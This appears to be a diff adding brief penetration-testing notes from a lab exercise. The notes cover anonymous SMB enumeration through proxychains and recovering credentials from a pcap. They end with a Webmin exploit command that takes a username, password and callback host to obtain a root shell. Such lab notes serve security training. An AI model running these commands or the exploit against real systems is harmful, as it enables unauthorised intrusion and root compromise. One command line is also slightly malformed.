@@ -1,0 +1,18 @@
+------------------
+NOTES
+------------------
+
+Connecting to the server with smbclient
+	proxychains -N -L \\172.16.1.17\
+		-N = no password
+		-L = list
+
+Check out the forensics share
+	proxychains smbclient -N \\\\172.16.1.17\\forensics
+
+Pull down the pcap file, filter for http traffic and find the user name and password hidden
+
+Logging into port 10000's webmin portal, find out of date webmin, msf module to exploit
+
+better is the webmin exploit on GH -> insta root shell
+	proxychains python2 webmin_exploit.py --rhost 172.16.1.17 --rport 10000 -u admin -p Password6543 --lhost 10.10.14.40
